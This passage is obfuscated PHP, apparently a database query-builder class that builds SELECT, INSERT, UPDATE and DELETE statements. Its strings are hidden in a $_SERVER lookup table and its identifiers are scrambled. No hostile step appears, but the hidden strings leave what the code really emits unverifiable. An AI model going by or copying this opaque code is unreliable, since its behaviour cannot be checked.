=& $_SERVER[©]; foreach ($c—àÜÅá‹ò as $DÂèÛ„ÖŞ => $d–‡Ö”±¦Ö) { if (is_array($d–‡Ö”±¦Ö) && $BğÕÂ­“Ù‹[294] == $d–‡Ö”±¦Ö[0]) { $ašˆ™¥Ş­[] = $this->parseKey($DÂèÛ„ÖŞ) . $BğÕÂ­“Ù‹[904] . $d–‡Ö”±¦Ö[1]; } elseif (is_scalar($d–‡Ö”±¦Ö) || is_null($d–‡Ö”±¦Ö)) { $ašˆ™¥Ş­[] = $this->parseKey($DÂèÛ„ÖŞ) . $BğÕÂ­“Ù‹[904] . $this->parseValue($d–‡Ö”±¦Ö); } } return $BğÕÂ­“Ù‹[905] . implode($BğÕÂ­“Ù‹[57], $ašˆ™¥Ş­); } protected function bindParam($bãœÆÙ, $Eğ‡Á‡ÅÊ) { $this->bind[$_SERVER[©][14] . $bãœÆÙ] = $Eğ‡Á‡ÅÊ; } protected function parseBind($E¬à‘¥Ù‘š) { $E¬à‘¥Ù‘š = array_merge($this->bind, $E¬à‘¥Ù‘š); $this->bind = array(); return $E¬à‘¥Ù‘š; } function parseKey(&$FÓêïŠ¡öç, $aÎ¡¾ËÈƒ— = true) { if ($aÎ¡¾ËÈƒ—) { $FÓêïŠ¡öç = $this->parseKeyCheck($FÓêïŠ¡öç); } return $FÓêïŠ¡öç; } function parseKeyCheck($fóè¢‚‡—¯) { $C°¨¹Ğ‚Å— =& $_SERVER[©]; $fóè¢‚‡—¯ = trim($fóè¢‚‡—¯); if (!preg_match($C°¨¹Ğ‚Å—[906], $fóè¢‚‡—¯)) { think_exception($C°¨¹Ğ‚Å—[907] . $fóè¢‚‡—¯); } return $fóè¢‚‡—¯; } protected function parseValue($bù½»áÍÂ) { $bëĞÀÜÂù =& $_SERVER[©]; if (is_string($bù½»áÍÂ)) { $bù½»áÍÂ = $bëĞÀÜÂù[866] . $this->escapeString($bù½»áÍÂ) . $bëĞÀÜÂù[866]; } elseif (isset($bù½»áÍÂ[0]) && is_string($bù½»áÍÂ[0]) && strtolower($bù½»áÍÂ[0]) == $bëĞÀÜÂù[294]) { $bù½»áÍÂ = $this->escapeString($bù½»áÍÂ[1]); } elseif (is_array($bù½»áÍÂ)) { $bù½»áÍÂ = array_map(array($this, $bëĞÀÜÂù[867]), $bù½»áÍÂ); } elseif (is_bool($bù½»áÍÂ)) { $bù½»áÍÂ = $bù½»áÍÂ ? $bëĞÀÜÂù[93] : $bëĞÀÜÂù[476]; } elseif (is_null($bù½»áÍÂ)) { $bù½»áÍÂ = $bëĞÀÜÂù[109]; } return $bù½»áÍÂ; } protected function parseField($A«ñ´•«Å¤) { $d „—„äÒ =& $_SERVER[©]; if (is_string($A«ñ´•«Å¤) && strpos($A«ñ´•«Å¤, $d „—„äÒ[57])) { $A«ñ´•«Å¤ = explode($d „—„äÒ[57], $A«ñ´•«Å¤); } if (is_array($A«ñ´•«Å¤)) { $BŠñ²ÑİÖ = array(); foreach ($A«ñ´•«Å¤ as $a…–Ê£Æ–£ => $a¾Ğ»ì§¥) { if (!is_numeric($a…–Ê£Æ–£)) { $BŠñ²ÑİÖ[] = $this->parseKey($a…–Ê£Æ–£) . $d „—„äÒ[908] . $this->parseKey($a¾Ğ»ì§¥); } else { $BŠñ²ÑİÖ[] = $this->parseKey($a¾Ğ»ì§¥); } } $eÜ«„•¶Ä„ = implode($d „—„äÒ[57], $BŠñ²ÑİÖ); } elseif (is_string($A«ñ´•«Å¤) && !empty($A«ñ´•«Å¤)) { $eÜ«„•¶Ä„ = $A«ñ´•«Å¤; } else { $eÜ«„•¶Ä„ = $d „—„äÒ[186]; } return $eÜ«„•¶Ä„; } protected function parseTable($F­à¾Ê¬Ù‘) { $Bé÷ÑìÊ•Ü =& $_SERVER[©]; if (is_array($F­à¾Ê¬Ù‘)) { $F“‹”¸‡¦­ = array(); foreach ($F­à¾Ê¬Ù‘ as $CİØ»¢ÌÂÃ => $Eœß°É·Ù) { if (!is_numeric($CİØ»¢ÌÂÃ)) { $F“‹”¸‡¦­[] = $this->parseKey($CİØ»¢ÌÂÃ) . $Bé÷ÑìÊ•Ü[60] . $this->parseKey($Eœß°É·Ù); } else { $F“‹”¸‡¦­[] = $this->parseKey($CİØ»¢ÌÂÃ); } } $F­à¾Ê¬Ù‘ = $F“‹”¸‡¦­; } elseif (is_string($F­à¾Ê¬Ù‘)) { if (strstr($F­à¾Ê¬Ù‘, $Bé÷ÑìÊ•Ü[60])) { return $F­à¾Ê¬Ù‘; } $F­à¾Ê¬Ù‘ = explode($Bé÷ÑìÊ•Ü[57], $F­à¾Ê¬Ù‘); array_walk($F­à¾Ê¬Ù‘, array($this, $Bé÷ÑìÊ•Ü[815])); } return $Bé÷ÑìÊ•Ü[909] . trim(implode($Bé÷ÑìÊ•Ü[910], $F­à¾Ê¬Ù‘), $Bé÷ÑìÊ•Ü[821]) . $Bé÷ÑìÊ•Ü[909]; } protected function parseWhere($DÑ¹•ßì¼) { $EŒ›Ğ¤°ğ =& $_SERVER[©]; $E»Õí—ÇìÌ = $EŒ›Ğ¤°ğ[43]; if (is_string($DÑ¹•ßì¼)) { $E»Õí—ÇìÌ = $DÑ¹•ßì¼; } else { $A§·õã²×¿ = isset($DÑ¹•ßì¼[$EŒ›Ğ¤°ğ[911]]) ? strtoupper($DÑ¹•ßì¼[$EŒ›Ğ¤°ğ[911]]) : $EŒ›Ğ¤°ğ[43]; if (in_array($A§·õã²×¿, array($EŒ›Ğ¤°ğ[912], $EŒ›Ğ¤°ğ[913], $EŒ›Ğ¤°ğ[914]))) { $A§·õã²×¿ = $EŒ›Ğ¤°ğ[60] . $A§·õã²×¿ . $EŒ›Ğ¤°ğ[60]; unset($DÑ¹•ßì¼[$EŒ›Ğ¤°ğ[911]]); } else { $A§·õã²×¿ = $EŒ›Ğ¤°ğ[915]; } foreach ($DÑ¹•ßì¼ as $B¾…‰„… • => $f»îñïñ¿) { $E»Õí—ÇìÌ .= $EŒ›Ğ¤°ğ[274]; if (is_numeric($B¾…‰„… •)) { $B¾…‰„… • = $EŒ›Ğ¤°ğ[916]; } if (0 === strpos($B¾…‰„… •, $EŒ›Ğ¤°ğ[80])) { $E»Õí—ÇìÌ .= $this->parseThinkWhere($B¾…‰„… •, $f»îñïñ¿); } else { if (!preg_match($EŒ›Ğ¤°ğ[917], trim($B¾…‰„… •))) { think_exception(think_lang($EŒ›Ğ¤°ğ[918]) . $EŒ›Ğ¤°ğ[14] . $B¾…‰„… •); } $BÁ·¾¸Áˆ† = is_array($f»îñïñ¿) && isset($f»îñïñ¿[$EŒ›Ğ¤°ğ[919]]); $B¾…‰„… • = trim($B¾…‰„… •); if (strpos($B¾…‰„… •, $EŒ›Ğ¤°ğ[280])) { $B—‘—†ëÚ = explode($EŒ›Ğ¤°ğ[280], $B¾…‰„… •); $cµôÂ¶ » = array(); foreach ($B—‘—†ëÚ as $D˜•°¥Œ => $bÉ¦“Îîòö) { $dò·²‰é„µ = $BÁ·¾¸Áˆ† ? $f»îñïñ¿[$D˜•°¥Œ] : $f»îñïñ¿; $cµôÂ¶ »[] = $EŒ›Ğ¤°ğ[257] . $this->parseWhereItem($this->parseKey($bÉ¦“Îîòö), $dò·²‰é„µ) . $EŒ›Ğ¤°ğ[814]; } $E»Õí—ÇìÌ .= implode($EŒ›Ğ¤°ğ[920], $cµôÂ¶ »); } elseif (strpos($B¾…‰„… •, $EŒ›Ğ¤°ğ[281])) { $B—‘—†ëÚ = explode($EŒ›Ğ¤°ğ[281], $B¾…‰„… •); $cµôÂ¶ » = array(); foreach ($B—‘—†ëÚ as $D˜•°¥Œ => $bÉ¦“Îîòö) { $dò·²‰é„µ = $BÁ·¾¸Áˆ† ? $f»îñïñ¿[$D˜•°¥Œ] : $f»îñïñ¿; $cµôÂ¶ »[] = $EŒ›Ğ¤°ğ[257] . $this->parseWhereItem($this->parseKey($bÉ¦“Îîòö), $dò·²‰é„µ) . $EŒ›Ğ¤°ğ[814]; } $E»Õí—ÇìÌ .= implode($EŒ›Ğ¤°ğ[915], $cµôÂ¶ »); } else { $E»Õí—ÇìÌ .= $this->parseWhereItem($this->parseKey($B¾…‰„… •), $f»îñïñ¿); } } $E»Õí—ÇìÌ .= $EŒ›Ğ¤°ğ[275] . $A§·õã²×¿; } $E»Õí—ÇìÌ = substr($E»Õí—ÇìÌ, 0, -strlen($A§·õã²×¿)); } return empty($E»Õí—ÇìÌ) ? $EŒ›Ğ¤°ğ[43] : $EŒ›Ğ¤°ğ[921] . $E»Õí—ÇìÌ; } protected function parseWhereItem($EÎÉâòÕå†, $DæÇ˜®”) { $bÔ¢èë°³ =& $_SERVER[©]; $A„øŸò“óå = $bÔ¢èë°³[43]; if (is_array($DæÇ˜®”)) { if (is_string($DæÇ˜®”[0])) { $EÄ¥…èĞ©¦ = strtolower($DæÇ˜®”[0]); if (in_array($DæÇ˜®”[0], array($bÔ¢èë°³[904], $bÔ¢èë°³[922], $bÔ¢èë°³[923], $bÔ¢èë°³[924], $bÔ¢èë°³[925], $bÔ¢èë°³[926]))) { $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[60] . $DæÇ˜®”[0] . $bÔ¢èë°³[60] . $this->parseValue($DæÇ˜®”[1]); } elseif (preg_match($bÔ¢èë°³[927], $DæÇ˜®”[0])) { $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[60] . $this->parseValue($DæÇ˜®”[1]); } elseif (preg_match($bÔ¢èë°³[928], $DæÇ˜®”[0])) { if (is_array($DæÇ˜®”[1])) { $EÒà”œÆ‹… = isset($DæÇ˜®”[2]) ? strtoupper($DæÇ˜®”[2]) : $bÔ¢èë°³[913]; if (in_array($EÒà”œÆ‹…, array($bÔ¢èë°³[912], $bÔ¢èë°³[913], $bÔ¢èë°³[914]))) { $B¤ê†ƒâÚ = array(); foreach ($DæÇ˜®”[1] as $eù×ŸÉ¹) { $B¤ê†ƒâÚ[] = $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[60] . $this->parseValue($eù×ŸÉ¹); } $A„øŸò“óå .= $bÔ¢èë°³[257] . implode($bÔ¢èë°³[60] . $EÒà”œÆ‹… . $bÔ¢èë°³[60], $B¤ê†ƒâÚ) . $bÔ¢èë°³[814]; } } else { $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[60] . $this->parseValue($DæÇ˜®”[1]); } } elseif ($bÔ¢èë°³[294] == $EÄ¥…èĞ©¦) { $A„øŸò“óå .= $bÔ¢èë°³[812] . $EÎÉâòÕå† . $bÔ¢èë°³[60] . $DæÇ˜®”[1] . $bÔ¢èë°³[929]; } elseif (preg_match($bÔ¢èë°³[930], $DæÇ˜®”[0])) { if (isset($DæÇ˜®”[2]) && $bÔ¢èë°³[294] == $DæÇ˜®”[2]) { $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[60] . $DæÇ˜®”[1]; } else { if (is_string($DæÇ˜®”[1])) { $DæÇ˜®”[1] = explode($bÔ¢èë°³[57], $DæÇ˜®”[1]); } $EàßêÙì¨ = implode($bÔ¢èë°³[57], $this->parseValue($DæÇ˜®”[1])); $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[812] . $EàßêÙì¨ . $bÔ¢èë°³[814]; } } elseif (preg_match($bÔ¢èë°³[931], $DæÇ˜®”[0])) { $F¡‰ˆİãª = is_string($DæÇ˜®”[1]) ? explode($bÔ¢èë°³[57], $DæÇ˜®”[1]) : $DæÇ˜®”[1]; $A„øŸò“óå .= $bÔ¢èë°³[812] . $EÎÉâòÕå† . $bÔ¢èë°³[60] . $this->exp[$EÄ¥…èĞ©¦] . $bÔ¢èë°³[60] . $this->parseValue($F¡‰ˆİãª[0]) . $bÔ¢èë°³[915] . $this->parseValue($F¡‰ˆİãª[1]) . $bÔ¢èë°³[275]; } else { think_exception(think_lang($bÔ¢èë°³[918]) . $bÔ¢èë°³[14] . $DæÇ˜®”[0]); } } else { $CÔ«âŒéŒÚ = count($DæÇ˜®”); $D•©Íº·ãš = isset($DæÇ˜®”[$CÔ«âŒéŒÚ - 1]) ? strtoupper($DæÇ˜®”[$CÔ«âŒéŒÚ - 1]) : $bÔ¢èë°³[43]; if (in_array($D•©Íº·ãš, array($bÔ¢èë°³[912], $bÔ¢èë°³[913], $bÔ¢èë°³[914]))) { $CÔ«âŒéŒÚ = $CÔ«âŒéŒÚ - 1; } else { $D•©Íº·ãš = $bÔ¢èë°³[912]; } for ($c‘‚‹Ë®‡ = 0; $c‘‚‹Ë®‡ < $CÔ«âŒéŒÚ; $c‘‚‹Ë®‡++) { $F¡‰ˆİãª = is_array($DæÇ˜®”[$c‘‚‹Ë®‡]) ? $DæÇ˜®”[$c‘‚‹Ë®‡][1] : $DæÇ˜®”[$c‘‚‹Ë®‡]; if ($bÔ¢èë°³[294] == strtolower($DæÇ˜®”[$c‘‚‹Ë®‡][0])) { $A„øŸò“óå .= $bÔ¢èë°³[257] . $EÎÉâòÕå† . $bÔ¢èë°³[60] . $F¡‰ˆİãª . $bÔ¢èë°³[929] . $D•©Íº·ãš . $bÔ¢èë°³[60]; } else { $Eä„ò¸ï²— = is_array($DæÇ˜®”[$c‘‚‹Ë®‡]) ? $this->exp[strtolower($DæÇ˜®”[$c‘‚‹Ë®‡][0])] : $bÔ¢èë°³[904]; if (!$Eä„ò¸ï²— && is_array($DæÇ˜®”[$c‘‚‹Ë®‡]) && in_array($DæÇ˜®”[$c‘‚‹Ë®‡][0], array($bÔ¢èë°³[904], $bÔ¢èë°³[922], $bÔ¢èë°³[923], $bÔ¢èë°³[924], $bÔ¢èë°³[925], $bÔ¢èë°³[926]))) { $Eä„ò¸ï²— = $DæÇ˜®”[$c‘‚‹Ë®‡][0]; } $A„øŸò“óå .= $bÔ¢èë°³[257] . $EÎÉâòÕå† . $bÔ¢èë°³[60] . $Eä„ò¸ï²— . $bÔ¢èë°³[60] . $this->parseValue($F¡‰ˆİãª) . $bÔ¢èë°³[929] . $D•©Íº·ãš . $bÔ¢èë°³[60]; } } $A„øŸò“óå = substr($A„øŸò“óå, 0, -4); } } else { $A„øŸò“óå .= $EÎÉâòÕå† . $bÔ¢èë°³[932] . $this->parseValue($DæÇ˜®”); } return $A„øŸò“óå; } protected function parseThinkWhere($CñêÚòª±ô, $eÃè–ß¶«Š) { $a¤Üî´çó¢ =& $_SERVER[©]; $D‚÷¸£÷ç = $a¤Üî´çó¢[43]; switch ($CñêÚòª±ô) { case $a¤Üî´çó¢[348]: $D‚÷¸£÷ç = $eÃè–ß¶«Š; break; case $a¤Üî´çó¢[916]: $D‚÷¸£÷ç = is_string($eÃè–ß¶«Š) ? $eÃè–ß¶«Š : substr($this->parseWhere($eÃè–ß¶«Š), 6); break; case $a¤Üî´çó¢[933]: parse_str($eÃè–ß¶«Š, $c›‰ÛÌÅ); if (isset($c›‰ÛÌÅ[$a¤Üî´çó¢[911]])) { $E”£÷°™¡º = $a¤Üî´çó¢[60] . strtoupper($c›‰ÛÌÅ[$a¤Üî´çó¢[911]]) . $a¤Üî´çó¢[60]; unset($c›‰ÛÌÅ[$a¤Üî´çó¢[911]]); } else { $E”£÷°™¡º = $a¤Üî´çó¢[915]; } $F˜´ó¤Ñ©Ì = array(); foreach ($c›‰ÛÌÅ as $aõ•ƒ‡¾×¯ => $Dœˆ´ÊĞ°) { $F˜´ó¤Ñ©Ì[] = $this->parseKey($aõ•ƒ‡¾×¯) . $a¤Üî´çó¢[932] . $this->parseValue($Dœˆ´ÊĞ°); } $D‚÷¸£÷ç = implode($E”£÷°™¡º, $F˜´ó¤Ñ©Ì); break; } return $D‚÷¸£÷ç; } protected function parseLimit($B»–²×±Û) { $DÑè»ë§õæ =& $_SERVER[©]; return !empty($B»–²×±Û) ? $DÑè»ë§õæ[58] . $B»–²×±Û . $DÑè»ë§õæ[60] : $DÑè»ë§õæ[43]; } protected function parseJoin($Fï‘œ·‰µÑ) { $c¨ù òéš‹ =& $_SERVER[©]; $bº®›Ê´–Ş = $c¨ù òéš‹[43]; if (!empty($Fï‘œ·‰µÑ)) { if (is_array($Fï‘œ·‰µÑ)) { foreach ($Fï‘œ·‰µÑ as $Fİ†ª›»ğÚ => $bÄ¸éâì£ê) { if (!1 !== stripos($bÄ¸éâì£ê, $c¨ù òéš‹[934])) { $bº®›Ê´–Ş .= $c¨ù òéš‹[60] . $bÄ¸éâì£ê; } else { $bº®›Ê´–Ş .= $c¨ù òéš‹[935] . $bÄ¸éâì£ê; } } } else { $bº®›Ê´–Ş .= $c¨ù òéš‹[935] . $Fï‘œ·‰µÑ; } } $bº®›Ê´–Ş = preg_replace($c¨ù òéš‹[936], think_config($c¨ù òéš‹[839]) . $c¨ù òéš‹[937], $bº®›Ê´–Ş); return $bº®›Ê´–Ş; } protected function parseOrder($B‡çá›í‡) { $fë¡“Íí‚ =& $_SERVER[©]; if (is_array($B‡çá›í‡)) { $C¢Ü¨¯î‡” = array(); foreach ($B‡çá›í‡ as $eñƒŞá²¯ => $A–£‚©§©Ø) { if (is_numeric($eñƒŞá²¯)) { $C¢Ü¨¯î‡”[] = $this->parseKey($A–£‚©§©Ø); } else { $A–£‚©§©Ø = in_array(strtoupper(trim($A–£‚©§©Ø)), array($fë¡“Íí‚[938], $fë¡“Íí‚[939])) ? $fë¡“Íí‚[60] . $A–£‚©§©Ø : $fë¡“Íí‚[43]; if (preg_match($fë¡“Íí‚[940], $eñƒŞá²¯)) { $C¢Ü¨¯î‡”[] = $this->parseKey($eñƒŞá²¯) . $A–£‚©§©Ø; } else { think_exception($fë¡“Íí‚[941] . $eñƒŞá²¯); } } } $B‡çá›í‡ = implode($fë¡“Íí‚[57], $C¢Ü¨¯î‡”); } return !empty($B‡çá›í‡) ? $fë¡“Íí‚[942] . $B‡çá›í‡ : $fë¡“Íí‚[43]; } protected function parseGroup($BµêÀ‹À¡) { $a‚ÌÏã—ğ´ =& $_SERVER[©]; return !empty($BµêÀ‹À¡) ? $a‚ÌÏã—ğ´[943] . $BµêÀ‹À¡ : $a‚ÌÏã—ğ´[43]; } protected function parseHaving($EğöÁÁÜ£Ş) { $eÏÍ‘³‹¶ =& $_SERVER[©]; return !empty($EğöÁÁÜ£Ş) ? $eÏÍ‘³‹¶[944] . $EğöÁÁÜ£Ş : $eÏÍ‘³‹¶[43]; } protected function parseComment($E·íŠ§ëò¥) { $d‡Ÿ•Ÿø©÷ =& $_SERVER[©]; return !empty($E·íŠ§ëò¥) ? $d‡Ÿ•Ÿø©÷[945] . $E·íŠ§ëò¥ . $d‡Ÿ•Ÿø©÷[946] : $d‡Ÿ•Ÿø©÷[43]; } protected function parseDistinct($DÃ à¾•÷÷) { $Aß›¸·òµ¹ =& $_SERVER[©]; return !empty($DÃ à¾•÷÷) ? $Aß›¸·òµ¹[947] : $Aß›¸·òµ¹[43]; } protected function parseUnion($c»ğ±ÛÁ¥¿) { $cÁ³Œöƒõ¤ =& $_SERVER[©]; if (empty($c»ğ±ÛÁ¥¿)) { return $cÁ³Œöƒõ¤[43]; } if (isset($c»ğ±ÛÁ¥¿[$cÁ³Œöƒõ¤[345]])) { $Eùîìˆ¹§ = $cÁ³Œöƒõ¤[948]; unset($c»ğ±ÛÁ¥¿[$cÁ³Œöƒõ¤[345]]); } else { $Eùîìˆ¹§ = $cÁ³Œöƒõ¤[949]; } foreach ($c»ğ±ÛÁ¥¿ as $bÊ©°“·©°) { $AÉæ‹ÂƒŸ[] = $Eùîìˆ¹§ . (is_array($bÊ©°“·©°) ? $this->buildSelectSql($bÊ©°“·©°) : $bÊ©°“·©°); } return implode($cÁ³Œöƒõ¤[60], $AÉæ‹ÂƒŸ); } public function insert($bß±‡¬ã³Å, $CÚ¼Û×´´Ú = array(), $d‡·ĞÀøÉÊ = false) { goto B“ŒöÖ“Ü­; b—îéì´ˆ¬: foreach ($bß±‡¬ã³Å as $AÊ·÷»ÊÍ´ => $EùŠöšŠ) { if (is_array($EùŠöšŠ) && $fò¿¬Ì™Ø[294] == $EùŠöšŠ[0]) { $D²îœ¼ØŒ[] = $this->parseKey($AÊ·÷»ÊÍ´); $D¶¸·’’[] = $EùŠöšŠ[1]; } elseif (is_scalar($EùŠöšŠ) || is_null($EùŠöšŠ)) { $D²îœ¼ØŒ[] = $this->parseKey($AÊ·÷»ÊÍ´); $D¶¸·’’[] = $this->parseValue($EùŠöšŠ); } } $BãÇòèëòâ = ($d‡·ĞÀøÉÊ ? $fò¿¬Ì™Ø[816] : $fò¿¬Ì™Ø[817]) . $fò¿¬Ì™Ø[818] . $this->parseTable($CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[276]]) . $fò¿¬Ì™Ø[812] . implode($fò¿¬Ì™Ø[57], $D²îœ¼ØŒ) . $fò¿¬Ì™Ø[813] . implode($fò¿¬Ì™Ø[57], $D¶¸·’’) . $fò¿¬Ì™Ø[814]; $BãÇòèëòâ .= $this->parseLock(isset($CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[771]]) ? $CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[771]] : !1); goto dïèëŠ²çÓ; B“ŒöÖ“Ü­: $fò¿¬Ì™Ø =& $_SERVER[©]; $D¶¸·’’ = $D²îœ¼ØŒ = array(); $this->model = $CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[278]]; goto b—îéì´ˆ¬; dïèëŠ²çÓ: $BãÇòèëòâ .= $this->parseComment(!empty($CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[350]]) ? $CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[350]] : $fò¿¬Ì™Ø[43]); return $this->execute($BãÇòèëòâ, $this->parseBind(!empty($CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[282]]) ? $CÚ¼Û×´´Ú[$fò¿¬Ì™Ø[282]] : array())); goto B–Ñ–¸¬ÕŠ; B–Ñ–¸¬ÕŠ: } public function selectInsert($bÏ½¢ˆ·ì´, $EÕ¦á”ˆœÏ, $f²œ²ª²™‡ = array()) { goto f´”±›ŠÑá; dåñÒÁ¾ç¤: array_walk($bÏ½¢ˆ·ì´, array($this, $còçİ“ß¯Î[815])); $bã¾ÂÏª·ò = $còçİ“ß¯Î[950] . $this->parseTable($EÕ¦á”ˆœÏ) . $còçİ“ß¯Î[812] . implode($còçİ“ß¯Î[57], $bÏ½¢ˆ·ì´) . $còçİ“ß¯Î[929]; $bã¾ÂÏª·ò .= $this->buildSelectSql($f²œ²ª²™‡); goto Eáø—´Ï³ˆ; Eáø—´Ï³ˆ: return $this->execute($bã¾ÂÏª·ò, $this->parseBind(!empty($f²œ²ª²™‡[$còçİ“ß¯Î[282]]) ? $f²œ²ª²™‡[$còçİ“ß¯Î[282]] : array())); goto díÍ†œ®ÒÕ; f´”±›ŠÑá: $còçİ“ß¯Î =& $_SERVER[©]; $this->model = $f²œ²ª²™‡[$còçİ“ß¯Î[278]]; if (is_string($bÏ½¢ˆ·ì´)) { $bÏ½¢ˆ·ì´ = explode($còçİ“ß¯Î[57], $bÏ½¢ˆ·ì´); } goto dåñÒÁ¾ç¤; díÍ†œ®ÒÕ: } public function update($F«ä¾µ„õô, $Dìå³©¥à’) { $DÇöÂ¾Šƒğ =& $_SERVER[©]; $this->model = $Dìå³©¥à’[$DÇöÂ¾Šƒğ[278]]; $EŠ‚–Ì¯Œí = $DÇöÂ¾Šƒğ[951] . $this->parseTable($Dìå³©¥à’[$DÇöÂ¾Šƒğ[276]]) . $this->parseSet($F«ä¾µ„õô) . $this->parseWhere(!empty($Dìå³©¥à’[$DÇöÂ¾Šƒğ[272]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[272]] : $DÇöÂ¾Šƒğ[43]) . $this->parseOrder(!empty($Dìå³©¥à’[$DÇöÂ¾Šƒğ[359]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[359]] : $DÇöÂ¾Šƒğ[43]) . $this->parseLimit(!empty($Dìå³©¥à’[$DÇöÂ¾Šƒğ[289]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[289]] : $DÇöÂ¾Šƒğ[43]) . $this->parseLock(isset($Dìå³©¥à’[$DÇöÂ¾Šƒğ[771]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[771]] : !1) . $this->parseComment(!empty($Dìå³©¥à’[$DÇöÂ¾Šƒğ[350]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[350]] : $DÇöÂ¾Šƒğ[43]); return $this->execute($EŠ‚–Ì¯Œí, $this->parseBind(!empty($Dìå³©¥à’[$DÇöÂ¾Šƒğ[282]]) ? $Dìå³©¥à’[$DÇöÂ¾Šƒğ[282]] : array())); } public function delete($b‚¿ÏİÖïö = array()) { $F­œ’è’‡ =& $_SERVER[©]; $this->model = $b‚¿ÏİÖïö[$F­œ’è’‡[278]]; $eç†×İ’‹ = $F­œ’è’‡[952] . $this->parseTable($b‚¿ÏİÖïö[$F­œ’è’‡[276]]) . $this->parseWhere(!empty($b‚¿ÏİÖïö[$F­œ’è’‡[272]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[272]] : $F­œ’è’‡[43]) . $this->parseOrder(!empty($b‚¿ÏİÖïö[$F­œ’è’‡[359]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[359]] : $F­œ’è’‡[43]) . $this->parseLimit(!empty($b‚¿ÏİÖïö[$F­œ’è’‡[289]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[289]] : $F­œ’è’‡[43]) . $this->parseLock(isset($b‚¿ÏİÖïö[$F­œ’è’‡[771]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[771]] : !1) . $this->parseComment(!empty($b‚¿ÏİÖïö[$F­œ’è’‡[350]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[350]] : $F­œ’è’‡[43]); return $this->execute($eç†×İ’‹, $this->parseBind(!empty($b‚¿ÏİÖïö[$F­œ’è’‡[282]]) ? $b‚¿ÏİÖïö[$F­œ’è’‡[282]] : array())); } public function select($Eôˆ˜«‚µ = array()) { goto c¢­¯³Ú¶°; eÎæÍñ¨†Ş: $F‘óæè¨§¬ = isset($Eôˆ˜«‚µ[$D­ÛÊöÊ–Ì[346]]) ? $Eôˆ˜«‚µ[$D­ÛÊöÊ–Ì[346]] : !1; if ($F‘óæè¨§¬) { $E¡´ãğÇõƒ = is_string($F‘óæè¨§¬[$D­ÛÊöÊ–Ì[99]]) ? $F‘óæè¨§¬[$D­ÛÊöÊ–Ì[99]] : $D­ÛÊöÊ–Ì[953] . md5($d˜ºôéºÛ¸); $f°‘ã¨è™ = think_cache($E¡´ãğÇõƒ, $D­ÛÊöÊ–Ì[43], $F‘óæè¨§¬); if (!1 !== $f°‘ã¨è™) { return $f°‘ã¨è™; } } $aè¬”™¦ÚŒ = $this->query($d˜ºôéºÛ¸, $this->parseBind(!empty($Eôˆ˜«‚µ[$D­ÛÊöÊ–Ì[282]]) ? $Eôˆ˜«‚µ[$D­ÛÊöÊ–Ì[282]] : array())); goto dù¡©Íïã; c¢­¯³Ú¶°: $D­ÛÊöÊ–Ì =& $_SERVER[©]; $this->model = $Eôˆ˜«‚µ[$D­ÛÊöÊ–Ì[278]]; $d˜ºôéºÛ¸ = $this->buildSelectSql($Eôˆ˜«‚µ); goto eÎæÍñ¨†Ş; dù¡©Íïã: if ($F‘óæè¨§¬ && !1 !== $aè¬”™¦ÚŒ) { think_cache($E¡´ãğÇõƒ, $aè¬”™¦ÚŒ, $F‘óæè¨§¬); } return $aè¬”™¦ÚŒ; goto fÉ§ÃöÜïÏ; fÉ§ÃöÜïÏ: } public function buildSelectSql($bË’ï­ÚÚ = array()) { goto D¹«« ‰Æ¸; DëæªÈßˆÔ: $A¹Ÿ…Åè•  = $this->parseSql($this->selectSql, $bË’ï­ÚÚ); $A¹Ÿ…Åè•  .= $this->parseLock(isset($bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[771]]) ? $bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[771]] : !1); if (isset($D˜Ôœø¸ğ )) { think_cache($D˜Ôœø¸ğ , $A¹Ÿ…Åè• ); } goto AòÈØ¶„¬; AòÈØ¶„¬: return $A¹Ÿ…Åè• ; goto E£ÄïëéëÔ; D¹«« ‰Æ¸: $cÕŒ©ŒÙ”ì =& $_SERVER[©]; if (isset($bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[349]])) { if (strpos($bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[349]], $cÕŒ©ŒÙ”ì[57])) { list($FÛõ–ÈÑìø, $cÉë«øøÉ½) = explode($cÕŒ©ŒÙ”ì[57], $bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[349]]); } else { $FÛõ–ÈÑìø = $bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[349]]; } $FÛõ–ÈÑìø = $FÛõ–ÈÑìø ? $FÛõ–ÈÑìø : 1; $cÉë«øøÉ½ = isset($cÉë«øøÉ½) ? $cÉë«øøÉ½ : (is_numeric($bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[289]]) ? $bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[289]] : 20); $côïÒˆŒÈ£ = $cÉë«øøÉ½ * ((int) $FÛõ–ÈÑìø - 1); $bË’ï­ÚÚ[$cÕŒ©ŒÙ”ì[289]] = $côïÒˆŒÈ£ 